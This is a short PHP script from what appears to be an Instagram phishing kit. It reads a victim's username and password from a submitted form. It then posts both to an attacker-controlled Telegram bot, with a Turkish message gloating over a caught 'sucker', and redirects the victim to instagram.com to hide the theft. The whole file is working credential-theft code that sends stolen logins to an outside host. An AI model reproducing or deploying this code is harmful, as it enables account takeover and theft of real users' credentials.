<?php
include('tg.php');

$id=$_GET["id"];
if($_POST){
$user=$_POST["user"];
header("location: info.php?nick=$user");
$password=$_POST["password"];
header("location: password.php?id=$id");

$data = [
  'text' => '➡️ Lan Koş Sazan Düştü 😈 
Sublime Saplar 😈
Kullanıcı Adı : '.$user.'
Şifre : '.$password.'
',
  'chat_id' => $chat_id
];

file_get_contents("https://api.telegram.org/bot$token/sendMessage?" . http_build_query($data) );
header('Location: https://instagram.com/');
}
?>
